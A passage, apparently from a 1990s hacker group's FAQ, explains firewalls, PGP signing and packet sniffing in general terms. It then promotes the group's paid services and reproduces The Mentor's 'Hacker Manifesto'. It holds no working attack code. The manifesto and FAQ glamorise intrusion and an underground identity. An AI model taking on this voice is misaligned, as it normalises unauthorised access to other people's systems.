+A. A firewall is a system or group of systems that enforces an access control policy between two networks. The actual means by which this is accomplished varies widely, but in principle, the firewall can be thought of as a pair of mechanisms: one which exists to block traffic, and the other which exists to permit traffic. Some firewalls place a greater emphasis on blocking traffic, while others emphasize permitting traffic. Probably the most important thing to recognize about a firewall is that it implements an access control policy. If you don't have a good idea what kind of access you want to permit or deny, or you simply permit someone or some product to configure a
+firewall based on what they or it think it should do, then they are making policy for your organization as a whole.
+
+
+Q.  How can I use PGP to benefit me?
+
+A. PGP is easy to use, it does give you enough rope so that you can hang yourself. You should
+become thoroughly familiar with the various options in PGP before using it to send serious
+messages. For example, giving the command pgp -sat <filename> will only sign a message, it
+will not encrypt it. Even though the output looks like it is encrypted, it really isn't. Anybody in the
+world would be able to recover the original text.
+
+Q.  What is a sniffer?
+
+A.  Taken from the Sniffer FAQ.
+Unlike telephone circuits, computer networks are shared communication channels. It is simply too expensive to dedicate local loops to the switch (hub) for each pair of communicating computers. Sharing means that computers can receive information that was intended for other machines. To capture the information going over the network is called sniffing. 
+
+The most popular way of connecting computers is through ethernet. Ethernet protocol works by sending packet information to all the hosts on the same circuit. The packet header contains the proper address of the destination machine. Only the machine with the matching address is suppose to accept the packet. A machine that is accepting all packets, no matter what the packet header says, is said to be in promiscuous mode. 
+
+Because, in a normal networking environment, account and password information is passed along
+ethernet in clear-text, it is not hard for an intruder once they obtain root to put a machine into
+promiscuous mode and by sniffing, compromise all the machines on the net.
+
+
+Q.  What is Psychotic?
+
+A. I would describe Psychotic as more of a proffessional group rather than just a hacking clan. We think about money first and hacking second, even though I'm sure that most of you have seen a few of our hacking projects...
+
+Q.  Is psychotic looking for new members?
+
+A. Well as of now we aren't looking for any additions to our staff, but stay posted we might decide that we need new members.
+
+Q.  What is Psychosis?
+
+A. Psychosis is a personal project taken up by Virtual Circuit. It's an award that he gives out to hackers that have done something to stand out(good webpage, revealed exploits, etc.). If you think that you should receive the award you can mail him about it.  But I can tell you now that the award isn't easy to get.
+
+Q.  What is the "Devil's Gateway?"
+
+A. The "Devil's Gateway" is a personal project taken up by VooDooHex. It's kind of like an information retrival guild, but yet it's still like a group. If you are interested in joining the Devil's Gateway you should mail VooDoo about it. 
+
+Q.  Where can I find some good resources on hacking and phreaking?
+
+A.  Well we aren't much for links but you should check the Psychosis page for his webpage award winners. He picks only the best.
+
+Q.  Who are all the members in Psychotic?
+
+A.  We would like to stay anonymous. But you will see a members name every now and then.
+
+Q.  What are Psychotic's offered services?
+
+A.  Psychotic has many different services, security testing, webpage design, graphic design, sponsoring, pop accounts, and webpage hosting. Each service has a different price.  You can read more about our services on the services section of the page.
+
+
+This is only the fisrt copy of our FAQ. We will be updating and adding information and questions to it as often as possible. I would appriciate if you would distribute and spready this text as much as you can. We don't want people asking us these questions anymore. Have fun and keep the underground alive.
+
+
+Another one got caught today, it's all over the papers. "Teenager Arrested in Computer
+   Crime Scandal", "Hacker Arrested after Bank Tampering"... Damn kids. They're all
+  alike. But did you, in your three-piece psychology and 1950's technobrain, ever take a
+ look behind the eyes of the hacker? Did you ever wonder what made him tick, what forces
+ shaped him, what may have molded him? I am a hacker, enter my world... Mine is a world
+  that begins with school... I'm smarter than most of the other kids, this crap they teach us
+  bores me... Damn underachiever.They're all alike. I'm in junior high or high school. I've
+ listened to teachers explain for the fifteenth time how to reduce a fraction. I understand it.
+ "No, Ms. Smith, I didn't show my work. I did it inmy head..." Damn kid. Probably copied
+  it. They're all alike. I made a discovery today. I found a computer. Wait a second, this is
+   cool. It does what I want it to. If it makes a mistake, it's because I screwed it up. Not
+  because it doesn't like me... Or feels threatened by me.. Or thinks I'm a smart ass.. Or
+doesn't like teaching and shouldn't be here... Damn kid. All he does is play games. They're
+ all alike. And then it happened... a door opened to a world... rushing through the phone line
+   like heroin through an addict's veins, an electronic pulse is sent out, a refuge from the
+    day-to-day incompetencies is sought... a board is found. "This is it... this is where I
+ belong..." I know everyone here... even if I've never met them, never talked to them, may
+  never hear from them again... I know you all... Damn kid. Tying up the phone line again.
+  They're all alike... You bet your ass we're all alike... we've been spoon-fed baby food at
+  school when we hungered for steak... the bits of meat that you did let slip through were
+ pre-chewed and tasteless. We've been dominated by sadists, or ignored by the apathetic.
+ The few that had something to teach found us willing pupils, but those few are like drops of
+  water in the desert. This is our world now... the world of the electron and the switch, the
+  beauty of the baud. We make use of a service already existing without paying for what
+ could be dirt-cheap if it wasn't run by profiteering gluttons, and you call us criminals. We
+ explore... and you call us criminals. We seek after knowledge... and you call us criminals.
+  We exist without skin color, without nationality, without religious bias... and you call us
+ criminals. You build atomic bombs, you wage wars, you murder, cheat, and lie to us and try
+ to make us believe it's for our own good, yet we're the criminals. Yes, I am a criminal. My
+  crime is that of curiosity. My crime is that of judging people by what they say and think,
+ not what they look like. My crime is that of outsmarting you, something that you will never
+  forgive me for. I am a hacker, and this is my manifesto. You may stop this individual,but
+                   you can't stop us all... after all, we're all alike. 
+
+                              +++The Mentor+++
